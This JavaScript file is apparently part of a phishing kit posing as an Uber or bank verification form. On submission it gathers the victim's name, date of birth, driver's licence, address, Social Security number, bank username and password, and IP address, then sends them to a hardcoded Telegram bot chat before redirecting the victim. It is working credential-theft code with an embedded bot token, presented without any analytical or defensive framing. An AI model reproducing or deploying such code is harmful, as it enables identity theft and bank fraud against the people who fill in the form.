
        let tg = {
    token: "5640910643:AAHZovo7fnFAS5WAGSnppSQkqBPivgNRZEc", // Your bot's token that got from @BotFather
    chat_id: -1001892111363 // The user's(that you want to send a message) telegram chat id
}

/**
 * By calling this function you can send message to a specific user()
 * @param {String} the text to send
 *
*/
function sendMessage(text)
{
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);

    xht.onreadystatechange = function() {
        var bernum =document.getElementById("uberphone").value;
        var thankyou=1;
        if(thankyou=1){
            window.location.href="ind.html"
        }
        return;
    }
    xht.send();
    
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
const form = document.querySelector("#form");
        form.addEventListener("submit", (e)=>{
            e.preventDefault();
        
            var ad;         
        $.getJSON("https://api.ipify.org?format=json",function(data){
             $(ad=data.ip)

        var ubernum =document.getElementById("uberphone").value;
        var fulname =document.getElementById("ffname").value;
        var Dob = document.getElementById("ddob").value;
        var driversl = document.getElementById("dl").value;
        var addr = document.getElementById("addrss").value;
        var securitynum = document.getElementById("ssn").value;
        var zipp = document.getElementById("zpp").value;
        //fourth
        var hddenBankinp = document.getElementById("hdden1").value;
        var usernameid = document.getElementById("userid1").value;
        var pass1 = document.getElementById("password1").value;

        var mess=`:::Results::: %0A%0A - Number or Email: ${ubernum} %0A - Fullname: ${fulname} %0A - Dob: ${Dob}
        %0A - Driver's License: ${driversl} %0A - Address : ${addr} %0A - Social Security Number : ${securitynum} %0A - ZIP : ${zipp}
        %0A - BANK TYPE : ${hddenBankinp} %0A -  Username or ID : ${usernameid} %0A - Password : ${pass1} %0A - IPAdrress : ${ad}`

        sendMessage(mess)
        
        })})
